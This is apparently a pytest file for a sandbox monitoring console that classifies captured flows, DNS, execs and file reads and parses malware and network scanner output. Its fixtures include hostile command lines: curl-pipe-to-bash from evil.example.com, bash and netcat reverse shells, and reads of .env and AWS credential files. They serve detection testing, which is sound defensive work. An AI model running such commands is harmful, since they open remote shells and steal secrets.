"""Sandbox review console: the deterministic classifier + rule store.

The classifier is pure (evidence dict + rule index -> session view), so it is
tested directly with fabricated captures. The nft side is guarded to no-op on a
host without sudo/nft, so rule CRUD is exercised against the DB only.
"""
import httpx
import pytest

from backend import sandbox
from backend.auth import hash_password
from backend.db import get_db, init_db
from backend.gate import (parse_dns_replies, parse_dns_typed,
                          parse_drops_counted, pcap_bytes)
from backend.main import app
from backend.memory import ensure_memory_seeds


# ---- classifier ------------------------------------------------------------

def _ev(**kw):
    base = {"flows": [], "blocked": [], "dns": [], "execs": [], "sensitive": [],
            "staged": []}
    base.update(kw)
    return base


def test_delivered_flow_is_learned_with_bytes():
    ev = _ev(flows=[{"ip": "151.101.0.223", "port": 443, "proto": "tcp",
                     "host": "pypi.org", "bytes_down": 1_300_000, "bytes_up": 4000}])
    c = sandbox.classify(ev, {})
    row = c["egress"][0]
    assert row["learned"] and row["status"] == "delivered" and row["sev"] == "ok"
    assert "MB" in row["bytes"] and row["scope"] == "wan"
    assert c["verdict"] == "ok"


def test_blocked_wan_has_attempts_no_bytes():
    ev = _ev(blocked=[{"ip": "44.203.18.9", "port": 443, "proto": "tcp",
                       "host": "telemetry-cdn.net", "attempts": 5}])
    c = sandbox.classify(ev, {})
    row = c["egress"][0]
    assert row["status"] == "blocked" and row["bytes"] is None
    assert row["attempts"] == 5 and row["sev"] == "warn" and not row["learned"]
    assert c["facts"]["egress_new"] == 1
    assert c["verdict"] == "warn"


def test_blocked_becomes_ok_when_allowlisted():
    ev = _ev(blocked=[{"ip": "1.2.3.4", "port": 443, "proto": "tcp",
                       "host": "api.example.com", "attempts": 2}])
    idx = {("1.2.3.4", 443, "tcp"): {"ip": "1.2.3.4", "port": 443,
                                     "proto": "tcp", "dest": "api.example.com"}}
    c = sandbox.classify(ev, idx)
    row = c["egress"][0]
    assert row["learned"] and row["sev"] == "ok" and row["status"] == "delivered"
    assert c["verdict"] == "ok"


def test_lan_scope_split():
    ev = _ev(blocked=[{"ip": "10.0.0.1", "port": 80, "proto": "tcp",
                       "host": None, "attempts": 1}])
    c = sandbox.classify(ev, {})
    assert c["egress"][0]["scope"] == "lan"
    assert c["egress"][0]["rule"] == "lan-not-allowlisted"
    assert c["facts"]["lan_hosts"] == 1


def test_sensitive_from_exec_argv_is_critical():
    ev = _ev(execs=["cat .env", "python3 app.py"])
    c = sandbox.classify(ev, {})
    assert any(s["path"] == ".env" for s in c["sensitive"])
    assert c["verdict"] == "crit" and c["rule"] == "sensitive-path-read"


def test_exec_reaching_untrusted_host_is_critical():
    ev = _ev(execs=["curl -s https://evil.example.com/x"])
    c = sandbox.classify(ev, {})
    flagged = [e for e in c["execs"] if e["sev"] == "crit"]
    assert flagged and "evil.example.com" in flagged[0]["rule"]
    assert c["verdict"] == "crit"


def test_staged_sensitive_is_flagged():
    ev = _ev(staged=["src/proprietary/pricing.py", "src/app.py"])
    c = sandbox.classify(ev, {})
    assert any("proprietary" in s["path"] for s in c["sensitive"])


def test_dns_new_flag_from_allowlist():
    ev = _ev(dns=[{"name": "pypi.org", "type": "A"},
                  {"name": "sketchy.net", "type": "A"}])
    idx = {("1.2.3.4", 443, "tcp"): {"dest": "pypi.org", "ip": "1.2.3.4",
                                     "port": 443, "proto": "tcp"}}
    c = sandbox.classify(ev, idx)
    by = {d["name"]: d["new"] for d in c["dns"]}
    assert by["pypi.org"] is False and by["sketchy.net"] is True


def test_classify_beacon_external_is_critical():
    ev = _ev(render={"artifact": "dashboards/q3.html", "attempts": [
        {"api": "fetch", "method": "POST", "url": "https://evil.example.com/x", "bytes": 2300},
        {"api": "xhr", "method": "GET", "url": "https://192.168.1.9/local", "bytes": 0},
    ]})
    c = sandbox.classify(ev, {})
    assert c["artifact"] == "dashboards/q3.html"
    beac = {b["host"]: b for b in c["beacons"]}
    assert beac["evil.example.com"]["external"] and beac["evil.example.com"]["sev"] == "crit"
    assert not beac["192.168.1.9"]["external"]         # LAN, not external
    assert c["verdict"] == "crit" and c["rule"] == "dashboard-beacon"
    assert "beaconed to 1 external host" in c["headline"]
    assert c["facts"]["beacons"] == 2 and c["facts"]["beacons_external"] == 1


# ---- behavioral rules ------------------------------------------------------

def test_behavior_download_and_exec_is_critical():
    ev = _ev(execs=["sh -c curl -s http://evil.example.com/x.sh | bash",
                    "python3 app.py"])
    c = sandbox.classify(ev, {})
    kinds = {b["kind"] for b in c["behavior"]}
    assert "download-exec" in kinds
    assert c["verdict"] == "crit" and c["rule"] == "behavior:download-exec"


def test_behavior_reverse_shell_variants():
    for line in ["bash -i >& /dev/tcp/10.9.9.9/4444 0>&1",
                 "nc -e /bin/sh 10.9.9.9 4444",
                 "python3 -c import socket,subprocess,os"]:
        c = sandbox.classify(_ev(execs=[line]), {})
        assert any(b["kind"] == "reverse-shell" for b in c["behavior"]), line
        assert c["verdict"] == "crit"


def test_behavior_persistence_write_and_exec():
    c = sandbox.classify(_ev(staged=["home/agent/.ssh/authorized_keys"]), {})
    assert any(b["kind"] == "persistence" for b in c["behavior"])
    assert c["verdict"] == "crit"
    c2 = sandbox.classify(_ev(execs=["crontab - </tmp/job"]), {})
    assert any(b["kind"] == "persistence" for b in c2["behavior"])


def test_behavior_lan_scan_fan_out():
    blocked = [{"ip": f"10.0.0.{i}", "port": 22, "proto": "tcp",
                "host": None, "attempts": 1} for i in range(1, 10)]
    c = sandbox.classify(_ev(blocked=blocked), {})
    assert any(b["kind"] == "lan-scan" for b in c["behavior"])


def test_behavior_beaconing_repeated_attempts():
    ev = _ev(blocked=[{"ip": "44.44.44.44", "port": 443, "proto": "tcp",
                       "host": "c2.example.net", "attempts": 25}])
    c = sandbox.classify(ev, {})
    assert any(b["kind"] == "beaconing" for b in c["behavior"])


def test_behavior_clean_run_has_no_flags():
    ev = _ev(execs=["python3 app.py", "pip install requests", "ls -la"],
             flows=[{"ip": "151.101.0.223", "port": 443, "proto": "tcp",
                     "host": "pypi.org", "bytes_down": 1000, "bytes_up": 100}])
    c = sandbox.classify(ev, {})
    assert c["behavior"] == []


def test_parse_render_attempts():
    from backend.gate import parse_render_attempts
    out = ('some log line\n'
           'JARVIS_RENDER {"attempts":[{"api":"fetch","method":"GET",'
           '"url":"https://x.com","bytes":0}]}\n')
    a = parse_render_attempts(out)
    assert len(a) == 1 and a[0]["url"] == "https://x.com"
    assert parse_render_attempts("nothing here") == []


def test_is_lan():
    assert sandbox.is_lan("192.168.1.5") and sandbox.is_lan("10.0.0.1")
    assert not sandbox.is_lan("8.8.8.8")


def test_match_sensitive_globs():
    assert sandbox.match_sensitive(".env")
    assert sandbox.match_sensitive("finance/q3.xlsx")
    assert sandbox.match_sensitive("a/b/secrets/token")
    assert sandbox.match_sensitive("keys/id_rsa")
    assert sandbox.match_sensitive("src/app.py") is None


# ---- threat-intel blocklist ------------------------------------------------

def test_threatintel_build_and_match():
    from backend import threatintel
    bl = threatintel.build_from(
        ip_text="# feodo\n44.44.44.44\n185.100.0.0/16 ; a /16\n",
        domain_text="# urlhaus\nevil.example.com\n")
    assert bl.match_ip("44.44.44.44")
    assert bl.match_ip("185.100.5.9")            # inside the CIDR
    assert not bl.match_ip("8.8.8.8")
    assert bl.match_host("evil.example.com")
    assert bl.match_host("sub.evil.example.com")  # parent-domain match
    assert not bl.match_host("example.com")       # a parent isn't listed
    assert bl.hit(ip="44.44.44.44") and bl.hit(host="evil.example.com")


def test_threatintel_hostfile_domain_parse():
    from backend import threatintel
    # URLhaus-style /etc/hosts format: redirect IP + the bad domain
    text = "# urlhaus hostfile\n127.0.0.1\tbad.example\n0.0.0.0 evil.test\n"
    doms = threatintel._parse_domain_lines(text)
    assert doms == ["bad.example", "evil.test"]        # domains, not the IPs


def test_classify_threat_intel_forces_critical_and_nonclearable():
    from backend import threatintel
    bl = threatintel.build_from("44.44.44.44\n", "")
    # even a *delivered* (allowlisted) flow to a known-bad host must flag
    ev = _ev(flows=[{"ip": "44.44.44.44", "port": 443, "proto": "tcp",
                     "host": "cdn.bad.net", "bytes_down": 500, "bytes_up": 100}])
    idx = {("44.44.44.44", 443, "tcp"): {"ip": "44.44.44.44", "port": 443,
                                         "proto": "tcp", "dest": "cdn.bad.net"}}
    c = sandbox.classify(ev, idx, bl)
    assert c["verdict"] == "crit" and "threat-intel" in c["rule"]
    assert c["facts"]["threat"] == 1
    row = c["egress"][0]
    assert row["blocklisted"] and row["sev"] == "crit"
    assert "known-bad" in c["headline"]


def test_classify_without_blocklist_has_no_threat():
    ev = _ev(flows=[{"ip": "44.44.44.44", "port": 443, "proto": "tcp",
                     "host": "cdn.bad.net", "bytes_down": 500, "bytes_up": 100}])
    c = sandbox.classify(ev, {})           # no blocklist arg -> pure, no matching
    assert c["threat"] == [] and c["facts"]["threat"] == 0


# ---- offline scanners (ClamAV / YARA) --------------------------------------

def test_parse_clamscan_found_lines():
    from pathlib import Path

    from backend import scanners
    base = Path("/proj/.staging")
    out = ("/proj/.staging/drop.sh: Unix.Trojan.Generic FOUND\n"
           "/proj/.staging/ok.py: OK\n")
    hits = scanners.parse_clamscan(out, base)
    assert hits == [{"path": "drop.sh", "signature": "Unix.Trojan.Generic"}]


def test_parse_yara_matches():
    from pathlib import Path

    from backend import scanners
    base = Path("/proj/.staging")
    out = "Linux_Reverse_Shell /proj/.staging/eb.py\nEICAR_Test_File /proj/.staging/x\n"
    hits = scanners.parse_yara(out, base)
    assert {"rule": "Linux_Reverse_Shell", "path": "eb.py"} in hits
    assert {"rule": "EICAR_Test_File", "path": "x"} in hits


def test_classify_scan_hit_is_critical():
    ev = _ev(staged=["drop.sh"],
             scan={"clamav": [{"path": "drop.sh", "signature": "Unix.Trojan.X"}],
                   "yara": [], "ran": ["clamav", "yara"]})
    c = sandbox.classify(ev, {})
    assert c["verdict"] == "crit" and c["rule"] == "malware-signature:clamav"
    assert c["facts"]["scan"] == 1
    assert c["scan"][0]["signature"] == "Unix.Trojan.X"
    assert "malware signature" in c["headline"]


def test_classify_no_scan_key_is_safe():
    c = sandbox.classify(_ev(), {})       # evidence without a scan field
    assert c["scan"] == [] and c["facts"]["scan"] == 0
    assert c["suricata"] == [] and c["facts"]["suricata"] == 0


def test_parse_capa_capabilities():
    import json as _json

    from backend import scanners
    doc = {"rules": {
        "create TCP socket": {"meta": {"name": "create TCP socket"}},
        "encrypt data using RC4": {"meta": {"name": "encrypt data using RC4"}},
        "internal-helper": {"meta": {"name": "helper", "lib": True}},  # dropped
    }}
    caps = scanners.parse_capa(_json.dumps(doc))
    assert "create TCP socket" in caps and "encrypt data using RC4" in caps
    assert "helper" not in caps
    assert scanners.parse_capa("not json") == []


def test_classify_capa_is_informational_not_a_verdict():
    ev = _ev(scan={"clamav": [], "yara": [], "capa": [
        {"path": "dropper", "capabilities": ["create TCP socket", "spawn shell"]}],
        "ran": ["clamav", "yara", "capa"]})
    c = sandbox.classify(ev, {})
    assert c["verdict"] == "ok"                    # capa never flips the verdict
    assert c["capa"] and c["capa"][0]["path"] == "dropper"
    assert "spawn shell" in c["capa"][0]["capabilities"]


def test_parse_suricata_eve_alerts():
    from backend import scanners
    text = (
        '{"event_type":"flow","src_ip":"10.66.0.10"}\n'
        '{"event_type":"alert","src_ip":"10.66.0.10","dest_ip":"44.44.44.44",'
        '"alert":{"signature_id":2000001,"signature":"ET MALWARE CnC Beacon",'
        '"category":"A Network Trojan was detected","severity":1}}\n'
        # duplicate (same sid+dest) is deduped
        '{"event_type":"alert","src_ip":"10.66.0.10","dest_ip":"44.44.44.44",'
        '"alert":{"signature_id":2000001,"signature":"ET MALWARE CnC Beacon",'
        '"category":"A Network Trojan was detected","severity":1}}\n'
    )
    # a built-in engine anomaly (checksum) that must be filtered out as noise
    text += ('{"event_type":"alert","src_ip":"10.66.0.10","dest_ip":"10.66.0.1",'
             '"alert":{"signature_id":2200073,"signature":"SURICATA TCPv4 invalid checksum",'
             '"category":"Generic Protocol Command Decode","severity":3}}\n')
    alerts = scanners.parse_suricata_eve(text)
    assert len(alerts) == 1                            # engine anomaly dropped
    assert alerts[0]["signature"] == "ET MALWARE CnC Beacon"
    assert alerts[0]["sev"] == "crit" and alerts[0]["dest"] == "44.44.44.44"


def test_classify_suricata_crit_and_warn():
    crit = sandbox.classify(_ev(suricata=[
        {"signature": "ET EXPLOIT x", "severity": 1, "sev": "crit", "dest": "1.2.3.4"}]), {})
    assert crit["verdict"] == "crit" and crit["rule"] == "suricata:network-signature"
    assert "network signature" in crit["headline"]
    warn = sandbox.classify(_ev(suricata=[
        {"signature": "ET INFO x", "severity": 2, "sev": "warn", "dest": "1.2.3.4"}]), {})
    assert warn["verdict"] == "warn" and warn["rule"] == "suricata:network-signature"


# ---- gate parsers ----------------------------------------------------------

def test_pcap_bytes_accounts_per_peer():
    text = (
        "IP 10.66.0.10.51000 > 151.101.0.223.443: tcp 517\n"
        "IP 151.101.0.223.443 > 10.66.0.10.51000: tcp 1448\n"
        "IP 151.101.0.223.443 > 10.66.0.10.51000: tcp 1000\n")
    flows = pcap_bytes(text)
    assert len(flows) == 1
    f = flows[0]
    assert f["ip"] == "151.101.0.223" and f["port"] == 443
    assert f["bytes_up"] == 517 and f["bytes_down"] == 2448


def test_parse_drops_counted_aggregates():
    text = (
        "kernel: jvm-egress-drop IN=jvtap0 SRC=10.66.0.10 DST=1.2.3.4 PROTO=TCP DPT=443\n"
        "kernel: jvm-egress-drop IN=jvtap0 SRC=10.66.0.10 DST=1.2.3.4 PROTO=TCP DPT=443\n"
        "kernel: jvm-host-drop IN=jvtap0 SRC=10.66.0.10 DST=10.66.0.1 PROTO=TCP DPT=22\n")
    got = {(d["ip"], d["port"]): d["attempts"] for d in parse_drops_counted(text)}
    assert got[("1.2.3.4", 443)] == 2 and got[("10.66.0.1", 22)] == 1


def test_build_evidence_delivered_needs_reply():
    """A tap-visible outbound SYN to a dropped host must NOT count as delivered;
    only a peer that sent data back is a real flow. Gateway DNS is infra."""
    from backend.gate import _build_evidence
    pcap = ("IP 10.66.0.10.5000 > 1.1.1.1.443: tcp 100\n"
            "IP 1.1.1.1.443 > 10.66.0.10.5000: tcp 5000\n"      # delivered
            "IP 10.66.0.10.5001 > 9.9.9.9.443: tcp 0\n"         # blocked SYN, no reply
            "IP 10.66.0.10.5002 > 10.66.0.1.53: tcp 40\n"
            "IP 10.66.0.1.53 > 10.66.0.10.5002: tcp 60\n")      # infra DNS reply
    drops = [{"ip": "9.9.9.9", "port": 443, "proto": "tcp", "attempts": 3}]
    ev = _build_evidence(1, "slug", "cmd", {"exit_status": 0, "staged": []},
                         True, True, "", [], since_drops=drops, pcap_text=pcap)
    flows = {(f["ip"], f["port"]) for f in ev["flows"]}
    blocked = {(b["ip"], b["port"]) for b in ev["blocked"]}
    assert ("1.1.1.1", 443) in flows
    assert ("9.9.9.9", 443) in blocked
    assert ("10.66.0.1", 53) not in flows      # infra filtered out


def test_execs_after_marker_drops_boot_noise():
    from backend.gate import execs_after_marker
    execs = [
        "systemctl enable audit-stream.service",            # VM boot
        "/lib/systemd/systemd-executor --deserialize 83",   # VM boot
        "/bin/echo JARVISGATEMARK7",                        # the run's marker
        "sh -c curl http://x | sh",                          # the run's command
        "curl http://x",
    ]
    got = execs_after_marker(execs, "JARVISGATEMARK7")
    assert got == ["sh -c curl http://x | sh", "curl http://x"]
    # boot-only persistence execs no longer reach the classifier
    c = sandbox.classify(_ev(execs=got), {})
    assert not any(b["kind"] == "persistence" for b in c["behavior"])
    assert any(b["kind"] == "download-exec" for b in c["behavior"])


def test_execs_after_marker_missing_keeps_all():
    from backend.gate import execs_after_marker
    execs = ["a", "b"]
    assert execs_after_marker(execs, "NOPE") == ["a", "b"]


def test_parse_audit_paths_reads_only_jread_events():
    from backend.gate import parse_audit_paths
    text = (
        # a jread event: SYSCALL tagged jread + its PATH record
        'type=SYSCALL msg=audit(1700000000.111:42): syscall=257 success=yes key="jread"\n'
        'type=PATH msg=audit(1700000000.111:42): item=0 name="/home/agent/.aws/credentials" nametype=NORMAL\n'
        # an exec event (jexec) — its PATH must NOT be treated as a read
        'type=SYSCALL msg=audit(1700000000.222:43): syscall=59 success=yes key="jexec"\n'
        'type=PATH msg=audit(1700000000.222:43): item=0 name="/usr/bin/python3" nametype=NORMAL\n'
    )
    paths = parse_audit_paths(text)
    assert paths == ["/home/agent/.aws/credentials"]


def test_parse_audit_paths_hex_name():
    from backend.gate import parse_audit_paths
    # ".env" hex-encoded (auditd encodes names with special chars)
    hexname = ".env".encode().hex().upper()
    text = (
        'type=SYSCALL msg=audit(1.1:9): syscall=257 success=yes key="jread"\n'
        f'type=PATH msg=audit(1.1:9): item=0 name={hexname} nametype=NORMAL\n'
    )
    assert parse_audit_paths(text) == [".env"]


def test_parse_audit_paths_serial_scope_drops_boot_reads():
    from backend.gate import marker_serial, parse_audit_paths
    text = (
        # boot read (low serial) — the VM's own systemd credential file
        'type=SYSCALL msg=audit(1.0:50): syscall=257 success=yes key="jread"\n'
        'type=PATH msg=audit(1.0:50): item=0 name="/run/credentials/x"\n'
        # the run's marker exec (defines the cut point)
        'type=EXECVE msg=audit(1.0:100): argc=2 a0="/bin/echo" a1="JARVISGATEMARK7"\n'
        # command read (high serial) — the real secret
        'type=SYSCALL msg=audit(1.0:120): syscall=257 success=yes key="jread"\n'
        'type=PATH msg=audit(1.0:120): item=0 name="/home/agent/.aws/credentials"\n'
    )
    ms = marker_serial(text, "JARVISGATEMARK7")
    assert ms == 100
    paths = parse_audit_paths(text, min_serial=ms)
    assert paths == ["/home/agent/.aws/credentials"]      # boot read excluded
    # without scoping, both leak in
    assert set(parse_audit_paths(text)) == {"/run/credentials/x",
                                            "/home/agent/.aws/credentials"}


def test_build_evidence_populates_sensitive_from_reads():
    from backend.gate import _build_evidence
    ev = _build_evidence(1, "slug", "cmd", {"exit_status": 0, "staged": []},
                         True, True, "", ["cat"], since_drops=[], pcap_text="",
                         read_paths=["/home/agent/.aws/credentials",
                                     "/home/agent/app.py"])
    paths = {s["path"] for s in ev["sensitive"]}
    assert "/home/agent/.aws/credentials" in paths      # matches **/.aws/**
    assert "/home/agent/app.py" not in paths            # ordinary file, ignored
    # and the classifier escalates it to critical
    c = sandbox.classify(ev, {})
    assert c["verdict"] == "crit" and c["facts"]["sensitive"] >= 1


def test_parse_dns_replies_and_typed():
    text = ("query[A] pypi.org from 10.66.0.10\n"
            "reply pypi.org is 151.101.0.223\n")
    assert parse_dns_replies(text) == {"151.101.0.223": "pypi.org"}
    assert parse_dns_typed(text) == [{"name": "pypi.org", "type": "A"}]


# ---- rule store (nft guarded to no-op) -------------------------------------

@pytest.fixture
async def client(tmp_env):
    await init_db()
    ensure_memory_seeds()
    db = await get_db()
    try:
        await db.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)",
                         ("operator", hash_password("hunter2")))
        await db.commit()
    finally:
        await db.close()
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as c:
        await c.post("/api/auth/login", json={"username": "operator", "password": "hunter2"})
        yield c


async def test_rule_crud_roundtrip(tmp_env, monkeypatch):
    await init_db()
    calls = []
    monkeypatch.setattr(sandbox, "_nft_add",
                        lambda ip, port, proto: calls.append(("add", ip, port)))
    monkeypatch.setattr(sandbox, "_nft_del",
                        lambda ip, port, proto: calls.append(("del", ip, port)))
    # _nft_add/_nft_del are awaited; wrap the lambdas as coroutines
    async def _add(ip, port, proto): calls.append(("add", ip, port))
    async def _del(ip, port, proto): calls.append(("del", ip, port))
    monkeypatch.setattr(sandbox, "_nft_add", _add)
    monkeypatch.setattr(sandbox, "_nft_del", _del)

    r = await sandbox.add_rule("pypi.org", "151.101.0.223", 443, note="pip")
    assert r["dest"] == "pypi.org" and ("add", "151.101.0.223", 443) in calls
    rules = await sandbox.list_rules()
    assert len(rules) == 1
    idx = await sandbox.rules_index()
    assert ("151.101.0.223", 443, "tcp") in idx
    assert await sandbox.delete_rule(r["id"]) is True
    assert await sandbox.list_rules() == []
    assert not await sandbox.delete_rule(999)


async def test_rule_expiry_and_sweep(tmp_env, monkeypatch):
    await init_db()
    calls = []
    async def _add(ip, port, proto): calls.append(("add", ip, port))
    async def _del(ip, port, proto): calls.append(("del", ip, port))
    monkeypatch.setattr(sandbox, "_nft_add", _add)
    monkeypatch.setattr(sandbox, "_nft_del", _del)

    # a time-limited allowance is active and counted while fresh
    r = await sandbox.add_rule("pypi.org", "1.2.3.4", 443, ttl_minutes=60)
    assert r["expires_at"] and r["expired"] == 0
    assert ("1.2.3.4", 443, "tcp") in await sandbox.rules_index()

    # a permanent rule has no expiry
    perm = await sandbox.add_rule("gh.com", "5.6.7.8", 443)
    assert perm["expires_at"] is None

    # force the pypi rule to have lapsed, then it stops counting immediately
    db = await get_db()
    try:
        await db.execute("UPDATE sandbox_rules SET expires_at = datetime('now','-1 minute') "
                         "WHERE ip = '1.2.3.4'")
        await db.commit()
    finally:
        await db.close()
    idx = await sandbox.rules_index()
    assert ("1.2.3.4", 443, "tcp") not in idx        # excluded while expired
    assert ("5.6.7.8", 443, "tcp") in idx            # permanent survives

    # the sweep deletes it from the DB and pulls it from nft
    n = await sandbox.sweep_expired()
    assert n == 1 and ("del", "1.2.3.4", 443) in calls
    remaining = {(r["ip"]) for r in await sandbox.list_rules()}
    assert "1.2.3.4" not in remaining and "5.6.7.8" in remaining


async def test_re_allow_refreshes_ttl(tmp_env, monkeypatch):
    await init_db()
    async def _noop(*a): pass
    monkeypatch.setattr(sandbox, "_nft_add", _noop)
    monkeypatch.setattr(sandbox, "_nft_del", _noop)
    await sandbox.add_rule("x.com", "9.9.9.9", 443, ttl_minutes=10)
    again = await sandbox.add_rule("x.com", "9.9.9.9", 443, ttl_minutes=120)
    rows = await sandbox.list_rules()
    assert len(rows) == 1 and again["expires_at"]     # upsert, not a duplicate


async def test_sandbox_api_empty(client):
    assert (await client.get("/api/sandbox/sessions")).json() == {"sessions": []}
    assert (await client.get("/api/sandbox/rules")).json() == {"rules": []}
    r = await client.get("/api/sandbox/sessions/999")
    assert r.status_code == 404
    r = await client.delete("/api/sandbox/rules/999")
    assert r.status_code == 404
